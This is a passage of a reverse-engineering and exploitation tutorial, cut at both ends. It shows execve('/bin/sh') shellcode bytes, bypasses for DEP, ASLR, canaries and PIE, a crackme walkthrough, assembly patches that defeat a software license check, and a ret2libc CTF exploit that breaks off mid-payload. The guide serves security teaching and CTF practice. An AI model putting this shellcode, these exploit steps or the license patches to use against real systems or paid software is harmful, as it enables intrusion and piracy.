&quot;/bin/sh&quot; (little-endian)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    push rdi            ; Push &quot;/bin/sh&quot; onto stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, rsp        ; RDI = pointer to &quot;/bin/sh&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor rsi, rsi        ; RSI = NULL (argv)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor rdx, rdx        ; RDX = NULL (envp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov al, 59          ; RAX = 59 (execve syscall)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall             ; Execute syscall</span><br></span></code></pre></div></div>
<p><strong>Assemble shellcode:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Assemble:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nasm </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> elf64 shellcode.asm </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> shellcode.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ld shellcode.o </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Extract bytes:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objdump </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> shellcode </span><span class="token parameter variable" style="color:#36acaa">-M</span><span class="token plain"> intel </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;^ &#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cut</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tr</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27; \n&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: 4831c05048bf2f62696e2f736800574889e74831f64831d2b03b0f05</span><br></span></code></pre></div></div>
<p><strong>Python shellcode payload:</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcode </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use in exploit:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> nop_sled </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> shellcode </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> return_address</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="bypassing-protections">Bypassing Protections<a href="#bypassing-protections" class="hash-link" aria-label="Direct link to Bypassing Protections" title="Direct link to Bypassing Protections" translate="no">​</a></h3>
<p><strong>DEP/NX (Data Execution Prevention):</strong></p>
<ul>
<li class=""><strong>What it does:</strong> Marks stack/heap as non-executable</li>
<li class=""><strong>Bypass:</strong> ROP (return-oriented programming)</li>
</ul>
<p><strong>ASLR (Address Space Layout Randomization):</strong></p>
<ul>
<li class=""><strong>What it does:</strong> Randomizes base addresses of stack, heap, libraries</li>
<li class=""><strong>Bypass:</strong> Information leak (leak address, calculate offsets)</li>
</ul>
<p><strong>Stack Canaries:</strong></p>
<ul>
<li class=""><strong>What it does:</strong> Places random value before return address, checks on function return</li>
<li class=""><strong>Detection:</strong></li>
</ul>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, qword ptr fs:[0x28]  ; Load canary from TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov qword ptr [rbp-0x8], rax  ; Store canary on stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; ... function body ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, qword ptr [rbp-0x8]  ; Load canary from stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor rax, qword ptr fs:[0x28]  ; Compare with original</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jne __stack_chk_fail          ; Crash if mismatch</span><br></span></code></pre></div></div>
<ul>
<li class=""><strong>Bypass:</strong> Leak canary value (via format string or info leak)</li>
</ul>
<p><strong>PIE (Position Independent Executable):</strong></p>
<ul>
<li class=""><strong>What it does:</strong> Binary can be loaded at any address (extends ASLR to code section)</li>
<li class=""><strong>Bypass:</strong> Information leak (leak code address, calculate gadget offsets)</li>
</ul>
<p><strong>Checking protections:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Linux: checksec (pwntools):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">checksec </span><span class="token parameter variable" style="color:#36acaa">--file</span><span class="token plain"> vulnerable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># RELRO: Partial RELRO</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Stack: No canary found</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># NX: NX enabled</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># PIE: No PIE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Windows: PESecurity (PowerShell):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Get-PESecurity </span><span class="token parameter variable" style="color:#36acaa">-file</span><span class="token plain"> vulnerable.exe</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="practical-workflows">Practical Workflows<a href="#practical-workflows" class="hash-link" aria-label="Direct link to Practical Workflows" title="Direct link to Practical Workflows" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="crackme-challenges">Crackme Challenges<a href="#crackme-challenges" class="hash-link" aria-label="Direct link to Crackme Challenges" title="Direct link to Crackme Challenges" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Reverse a &quot;crackme&quot; challenge to find the correct password.</p>
<p><strong>Workflow:</strong></p>
<p><strong>1. Initial triage:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">file</span><span class="token plain"> crackme</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: ELF 64-bit LSB executable</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strings crackme </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: &quot;Enter password:&quot;, &quot;Correct!&quot;, &quot;Wrong!&quot;</span><br></span></code></pre></div></div>
<p><strong>2. Disassemble in Ghidra:</strong></p>
<ul>
<li class="">Load binary → Analyze</li>
<li class="">Find <code>main</code> function (or search for &quot;Enter password&quot; string, find xrefs)</li>
</ul>
<p><strong>3. Identify comparison:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Decompiled code (Ghidra):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> input</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Enter password: &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;%s&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> input</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">strcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">input</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;secret_password&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Correct!\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Wrong!\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>4. Extract password:</strong></p>
<ul>
<li class="">Password hardcoded: <code>&quot;secret_password&quot;</code></li>
<li class="">Alternative: Dynamic analysis (set breakpoint on <code>strcmp</code>, inspect arguments)</li>
</ul>
<p><strong>5. Verify:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./crackme</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Enter password: secret_password</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: Correct!</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="patching-binaries">Patching Binaries<a href="#patching-binaries" class="hash-link" aria-label="Direct link to Patching Binaries" title="Direct link to Patching Binaries" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Patch a license check to always return &quot;valid.&quot;</p>
<p><strong>Workflow:</strong></p>
<p><strong>1. Find license check in IDA/Ghidra:</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Original code:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call check_license  ; Returns 0 (invalid) or 1 (valid)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test eax, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jz license_invalid  ; Jump if zero (invalid)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; ... license valid path ...</span><br></span></code></pre></div></div>
<p><strong>2. Patch comparison:</strong></p>
<p><strong>Option A: Patch jump (always take &quot;valid&quot; path):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Before:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jz license_invalid  ; 74 XX (conditional jump)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; After:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jmp license_valid   ; EB XX (unconditional jump)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Or: NOP the jump entirely</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nop                 ; 90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nop                 ; 90</span><br></span></code></pre></div></div>
<p><strong>Option B: Patch function to always return 1:</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Patch check_license function:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Before:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">check_license:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; ... complex license verification ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; After:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">check_license:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov eax, 1      ; Always return 1 (valid)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret</span><br></span></code></pre></div></div>
<p><strong>3. Apply patch in IDA:</strong></p>
<ul>
<li class=""><strong>Edit → Patch program → Assemble</strong> (modify instructions)</li>
<li class=""><strong>Edit → Patch program → Apply patches to input file</strong> (save patched binary)</li>
</ul>
<p><strong>4. Verify:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./patched_binary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># License check bypassed!</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="malware-analysis-integration">Malware Analysis Integration<a href="#malware-analysis-integration" class="hash-link" aria-label="Direct link to Malware Analysis Integration" title="Direct link to Malware Analysis Integration" translate="no">​</a></h3>
<p><strong>See <a class="" href="/intel-codex/Security/Analysis/sop-malware-analysis">Malware Analysis</a> for comprehensive malware reversing workflows.</strong></p>
<p><strong>Quick integration:</strong></p>
<ol>
<li class=""><strong>Static analysis</strong> (Ghidra/IDA): Identify suspicious functions (network, encryption, persistence)</li>
<li class=""><strong>Dynamic analysis</strong> (x64dbg/GDB): Monitor API calls, network traffic, file modifications</li>
<li class=""><strong>Extract IOCs</strong> (IPs, domains, file hashes, registry keys)</li>
<li class=""><strong>Behavioral analysis</strong></li>
</ol>
<p><strong>Example: Extract C2 server address:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Static: Search for IP/domain strings</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strings malware.exe </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-E</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;([0-9]{1,3}\.){3}[0-9]{1,3}|https?://&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Dynamic: Monitor network calls in x64dbg</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Set breakpoint on &quot;connect&quot;, &quot;WSAConnect&quot;, &quot;InternetConnectA&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Inspect arguments when hit (IP, port in sockaddr structure)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ctf-binary-exploitation">CTF Binary Exploitation<a href="#ctf-binary-exploitation" class="hash-link" aria-label="Direct link to CTF Binary Exploitation" title="Direct link to CTF Binary Exploitation" translate="no">​</a></h3>
<p><strong>Scenario:</strong> CTF pwn challenge with buffer overflow.</p>
<p><strong>Workflow:</strong></p>
<p><strong>1. Download binary and check protections:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">checksec chall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: NX enabled, No PIE, No canary</span><br></span></code></pre></div></div>
<p><strong>2. Find vulnerability (buffer overflow in <code>gets()</code>):</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Decompiled:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">vuln</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">gets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// Vulnerable!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>3. Find offset to return address:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Generate cyclic pattern:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;from pwn import *; print(cyclic(200))&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> pattern.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Run in GDB:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb ./chall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> pattern.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Crash at RIP = 0x6161616b (&quot;kaaa&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Find offset:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;from pwn import *; print(cyclic_find(0x6161616b))&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Offset: 72</span><br></span></code></pre></div></div>
<p><strong>4. Develop exploit (ret2libc to bypass NX):</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Addresses:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">puts_plt </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x400530</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># puts@PLT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">puts_got </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x601018</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># puts@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rdi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4006d3</span><span class="token plain">       </span><span class="token comment" style="color:#999988;font-style:italic"># pop rdi; ret gadget</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4006d4</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic"># ret gadget (for alignment)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x400626</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic"># main function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Stage 1: Leak libc address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" 